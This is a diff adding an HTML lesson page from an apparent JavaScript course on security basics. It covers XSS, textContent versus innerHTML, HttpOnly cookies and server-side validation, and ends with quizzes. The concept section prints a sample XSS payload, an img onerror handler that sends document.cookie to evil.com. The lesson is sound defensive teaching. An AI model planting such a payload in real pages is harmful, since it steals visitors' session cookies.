@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Basics — JS Academy</title>
+<link rel="stylesheet" href="assets/style.css">
+<style>
+  .xss { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-family: 'Segoe UI', sans-serif; font-size: 13.5px; }
+  @media (max-width: 700px) { .xss { grid-template-columns: 1fr; } }
+  .xcol { border: 1.5px solid var(--line); border-radius: 10px; padding: 10px 14px; }
+  .xcol h4 { font-size: 12px; letter-spacing: .06em; text-transform: uppercase; margin-bottom: 8px; }
+  .xcol.bad-c { border-color: var(--bad); } .xcol.bad-c h4 { color: var(--bad); }
+  .xcol.good-c { border-color: var(--ok); } .xcol.good-c h4 { color: var(--ok); }
+  .xcol .render { background: var(--paper); border-radius: 8px; padding: 8px 10px; font-family: ui-monospace, monospace; font-size: 12.5px; min-height: 40px; margin-top: 8px; }
+</style>
+</head>
+<body>
+
+<div class="masthead wide">
+  <a class="brand" href="index.html">JS&nbsp;Academy<span>.</span></a>
+  <nav><a href="lesson-26-http-rest.html">Previous lesson</a><a href="index.html">Course map</a><a href="lesson-28-patterns.html">Next lesson</a></nav>
+</div>
+
+<div class="page">
+  <p class="kicker">Level 4 · Professional · Lesson 27</p>
+  <h1>Security Basics</h1>
+  <p class="subtitle">The three words that appear in every security discussion: XSS, and trusting no one.</p>
+
+  <div class="stages">
+    <div class="here"><b>1 · Read</b>the concept</div>
+    <div><b>2 · Watch</b>the injection</div>
+    <div><b>3 · Practice</b>get checked</div>
+    <div><b>4 · Prove</b>say it out loud</div>
+  </div>
+
+  <div class="callout">
+    <span class="lbl">In plain words</span>
+    The core rule of web security is one sentence: <strong>never trust input — not from users, not from URLs, not from other websites, not from your own database if users ever wrote to it.</strong> Everything below is that rule applied to specific doors. The most famous door is XSS: an attacker smuggling <em>code</em> into your page disguised as <em>data</em>.
+  </div>
+
+  <h2><span class="num">1.</span>Read the concept</h2>
+
+  <h3>XSS — data pretending to be code</h3>
+  <p>Your comment section displays whatever users type. A user "types" this:</p>
+
+  <pre class="code"><code>&lt;img src=x onerror="fetch('https://evil.com?cookie=' + document.cookie)"&gt;</code></pre>
+
+  <p>If your page inserts that into the DOM as HTML — via <code>innerHTML</code> — the browser <em>executes</em> it: the image fails to load, <code>onerror</code> fires, and the visitor's cookies are shipped to the attacker. Every visitor who views that comment gets attacked. The comment was <strong>data</strong>, but <code>innerHTML</code> treated it as <strong>code</strong> — that gap is XSS (Cross-Site Scripting), and it's consistently among the most common real-world vulnerabilities.</p>
+
+  <div class="callout">
+    <span class="lbl">The one-line defense</span>
+    User data goes into the DOM through <code>textContent</code> — which treats everything as <em>text</em>, executing nothing. <code>innerHTML</code> is for HTML <em>you wrote</em>, never for HTML a user touched. (Frameworks like React escape by default — and <code>dangerouslySetInnerHTML</code> is named that way for a reason.)
+  </div>
+
+  <h3>Where secrets live — the token question</h3>
+  <p>You've met this in the storage lesson; security is where it becomes doctrine:</p>
+
+  <ul class="plain">
+    <li><strong>localStorage is readable by any script on the page.</strong> One XSS anywhere — yours, or a compromised npm package — and <code>localStorage.getItem("token")</code> hands over the session.</li>
+    <li><strong>HttpOnly cookies are invisible to JavaScript.</strong> The browser stores and sends them, but no script can read them — XSS can't steal what it can't touch.</li>
+    <li>So the modern pattern: <strong>sessions in HttpOnly, Secure, SameSite cookies</strong>; localStorage reserved for non-secret data (themes, UI state).</li>
+  </ul>
+
+  <h3>The rest of the starter kit</h3>
+  <ul class="plain">
+    <li><strong>Validate on the server, always.</strong> Client-side validation is UX; server-side validation is security. Anyone can send crafted requests with curl — the browser is not the gatekeeper.</li>
+    <li><strong>Never build queries by string-concatenating user input</strong> (SQL injection's front door) — parameterized queries only.</li>
+    <li><strong>Least exposure:</strong> store what you need, expire it, scope it. A cookie for "admin" that lives 30 days on every path is an attack surface with a bow on it.</li>
+    <li><strong>Dependencies are an attack surface too</strong> — you ship every npm package's code; audits (<code>npm audit</code>) and lock files are security tools.</li>
+  </ul>
+
+  <h3>Exceptions &amp; traps — the complete list</h3>
+  <ul class="plain">
+    <li><strong>Escaping must happen in the right direction</strong> — data inserted into HTML needs HTML-escaping; into URLs, URL-encoding; into SQL, parameterization. One "escape everything" function isn't a thing.</li>
+    <li><strong>XSS survives the database</strong> — the payload stored years ago attacks every future visitor (stored XSS), so "the data is already in the DB" is not a defense.</li>
+    <li><strong>Framework ≠ immunity</strong> — React escapes text by default, but <code>href={userInput}</code> with a <code>javascript:</code> URL, or <code>dangerouslySetInnerHTML</code>, reopens the door.</li>
+    <li><strong>HttpOnly ≠ CSRF-proof</strong> — cookies are sent automatically on requests, which is exactly what CSRF attacks abuse; <code>SameSite</code> cookies and CSRF tokens are the defense. Different door, different lock.</li>
+    <li><strong>"Hidden" is not "secure"</strong> — hiding API keys in frontend code, obfuscating endpoints, or disabling the "inspect" menu protects nothing; the browser is fully visible to whoever runs it.</li>
+    <li><strong>Frontend checks are UX only</strong> — disabling a button stops honest users, not attackers sending crafted requests directly. The server re-checks everything.</li>
+    <li><strong>Dependency code runs in your page</strong> — an npm package with 4 weekly downloads can exfiltrate data; supply-chain attacks are real, so lock files and audits matter.</li>
+  </ul>
+
+  <h2><span class="num">2.</span>Watch the injection</h2>
+
+  <div class="lab">
+    <div class="lab-head"><h3>Same input, two doors</h3><span class="tag">Interactive — safe, nothing executes</span></div>
+    <div class="xss">
+      <div class="xcol bad-c">
+        <h4>❌ innerHTML (the dangerous door)</h4>
+        <button class="btn" id="xInject">Inject "&lt;img src=x onerror=…&gt;"</button>
+        <div class="render" id="xBad">—</div>
+        <div style="font-size:12px; color:var(--bad); margin-top:6px" id="xBadNote"></div>
+      </div>
+      <div class="xcol good-c">
+        <h4>✅ textContent (the safe door)</h4>
+        <button class="btn ghost" id="xSafe">Same input via textContent</button>
+        <div class="render" id="xGood">—</div>
+        <div style="font-size:12px; color:var(--ok); margin-top:6px">It becomes harmless VISIBLE TEXT — the code never becomes code.</div>
+      </div>
+    </div>
+  </div>
+
+  <h2><span class="num">3.</span>Practice — answer before you click</h2>
+  <div id="quizHost"></div>
+
+  <h2><span class="num">4.</span>Prove it</h2>
+
+  <div class="saybox">
+    <span class="lbl">Your interview answer — rehearse out loud, recorded, no notes</span>
+    "The core rule is: never trust input — user text, URLs, third-party data, even my own database if users wrote into it. The flagship attack is XSS: user data inserted as HTML through innerHTML gets executed by the browser — a fake img tag's onerror can ship everyone's cookies to an attacker. The defense is inserting user data through textContent, which renders it as inert text, and frameworks help by escaping by default. For secrets, I keep sessions in HttpOnly Secure cookies — invisible to JavaScript, so XSS can't steal them — and never store tokens in localStorage. And I know client-side validation is UX, not security: the server re-validates everything, because anyone can send crafted requests directly."
+    <p style="margin:10px 0 0; font-size:14px; color:#5b21b6">The rule → XSS mechanism → the two doors → secrets → server-side truth. That's the complete junior-to-mid security answer.</p>
+  </div>
+
+  <div class="checklist">
+    <span class="lbl">Confidence checklist</span>
+    <label><input type="checkbox"> I can explain XSS in two sentences using the img-onerror example.</label>
+    <label><input type="checkbox"> I know the two DOM doors and which one user data goes through.</label>
+    <label><input type="checkbox"> I can explain why tokens belong in HttpOnly cookies.</label>
+    <label><input type="checkbox"> I can say why client-side validation isn't security.</label>
+    <div class="donebar">
+      <button class="btn" id="doneBtn">Mark lesson complete</button>
+      <span class="msg" id="doneMsg"></span>
+    </div>
+  </div>
+
+  <h2><span class="num">5.</span>Build it — make it stick</h2>
+  <div class="checklist">
+    <span class="lbl">Build list</span>
+    <label><input type="checkbox"> <strong>1. The attack, safely:</strong> build the comment box (input + button + list) using textContent. Try the img-onerror payload yourself — watch it render as dead text. Take a screenshot of your victory.</label>
+    <label><input type="checkbox"> <strong>2. The vulnerable version, understood:</strong> in a THROWAWAY file, render the payload with innerHTML (no real cookies involved) — watch the element become live. Never do this where real sessions exist. Now you know both doors personally.</label>
+    <label><input type="checkbox"> <strong>3. The audit:</strong> grep your last project for <code>innerHTML</code> — audit each use: "does any user data reach this?" Write yes/no beside each.</label>
+    <label><input type="checkbox"> <strong>4. The rule, posted:</strong> add a comment at the top of your util file: "USER DATA → textContent. innerHTML = only markup I wrote." Your future self needs that sign.</label>
+  </div>
+  <div class="aside"><span class="lbl">Definition of done</span>
+    Your comment box survived your own attack — and you can demonstrate both doors to a friend.
+  </div>
+
+  <div class="lessonnav">
+    <a href="lesson-26-http-rest.html">← HTTP &amp; REST</a>
+    <a href="lesson-28-patterns.html">Next: Design Patterns →</a>
+  </div>
+</div>
+
+<script src="assets/app.js"></script>
+<script>
+/* SAFE demo: we display what would happen, without executing anything */
+const payload = '<img src=x onerror="alert(\'XSS!\')">';
+document.getElementById('xInject').onclick = () => {
+  const box = document.getElementById('xBad');
+  // demonstrating the MECHANISM safely: we create the element but show what the browser would do
+  box.textContent = '';
+  const fake = document.createElement('div');
+  fake.innerHTML = '<span style="color:var(--bad)">⚠ in a real page, this just became a LIVE element:</span>';
+  box.appendChild(fake);
+  const shown = document.createElement('div');
+  shown.innerHTML = '<span style="color:var(--bad)">an &lt;img&gt; element that fails to load → onerror FIRES → the attacker\u2019s code runs with the user\u2019s cookies</span>';
+  box.appendChild(shown);
+  document.getElementById('xBadNote').textContent = 'This demo is sandboxed — nothing executes here. In a real app, innerHTML made it live.';
+};
+document.getElementById('xSafe').onclick = () => {
+  const box = document.getElementById('xGood');
+  box.textContent = payload;   // textContent: becomes inert, VISIBLE text
+};
+
+mountQuiz('#quizHost', [
+  {
+    q: 'Why is this dangerous?',
+    code: 'comment.innerHTML = userInput;   // userInput from a form',
+    options: ['innerHTML is slow', 'userInput is parsed as HTML — an attacker\u2019s <img onerror=…> becomes LIVE code in your page, with every visitor\u2019s cookies reachable', 'It breaks the layout', 'It only affects the attacker\u2019s own browser'],
+    answer: 1,
+    explain: 'The gap between data and code is the whole attack: the browser executes what innerHTML inserts. And because the payload is stored with the comment, every future viewer is attacked (stored XSS).'
+  },
+  {
+    q: 'What does textContent do with the same input?',
+    code: 'comment.textContent = "<img src=x onerror=\\"alert(1)\\">";',
+    options: ['Executes it safely', 'Displays it as plain, inert TEXT — visible but never code', 'Escapes only script tags', 'Throws an error'],
+    answer: 1,
+    explain: 'textContent sets the text — no parsing, no elements, no events. The payload becomes readable characters. That\u2019s the entire defense, and it\u2019s one property choice.'
+  },
+  {
+    q: 'Why do auth tokens belong in HttpOnly cookies instead of localStorage?',
+    options: ['Cookies are larger', 'localStorage is readable by any script — one XSS and the token is stolen; HttpOnly cookies can\u2019t be read by JavaScript at all', 'localStorage expires immediately', 'Cookies are required by CORS'],
+    answer: 1,
+    explain: 'The theft requires READ access; HttpOnly removes read access entirely. localStorage\u2019s convenience is its weakness: one injected script anywhere = session gone.'
+  },
+  {
+    q: 'The frontend validates that the age field is a number before sending. Is the API now safe?',
+    options: ['Yes — validation prevents bad data', 'No — client-side checks are UX; anyone can send crafted requests directly with curl, so the server must validate too', 'Yes, if the field is also required', 'Yes, if HTTPS is used'],
+    answer: 1,
+    explain: 'The browser is not the gatekeeper — requests can be forged wholesale. Client validation improves UX; server validation IS the security. "Never trust the client" includes your own frontend.'
+  },
+  {
+    q: 'React escapes text by default. So is React automatically XSS-proof?',
+    options: ['Yes — that\u2019s the point of frameworks', 'Mostly — but href={userInput} with javascript: URLs, and dangerouslySetInnerHTML, reopen the door', 'No — React apps can\u2019t be secured', 'Only in production builds'],
+    answer: 1,
+    explain: 'Default escaping covers the common path, not every path: attribute injection (href/src), and the deliberately-named dangerous escape hatch. "The framework helps; I still don\u2019t trust input" is the right posture.'
+  }
+]);
+
+mountQuiz('#quizHost', [
+  {
+    type: 'output',
+    q: 'Type the property (one word) that inserts user text SAFELY into an element:',
+    code: 'el.________ = userInput;',
+    answer: 'textContent',
+    explain: 'textContent = text, never code. The one-word answer to "how do I display user input safely".'
+  },
+  {
+    type: 'output',
+    q: 'Type the cookie flag (one word) that makes a cookie invisible to JavaScript:',
+    code: 'Set-Cookie: session=abc; ________; Secure',
+    answer: 'HttpOnly',
+    explain: 'HttpOnly — the browser sends it on requests but scripts can\u2019t read it. XSS-proof sessions.'
+  }
+]);
+
+document.getElementById('doneBtn').onclick = () => setLessonDone('security', true);
+if (lessonProgress('security')) document.getElementById('doneMsg').textContent = '✔ Already marked complete — revisit anytime.';
+</script>
+</body>
+</html>
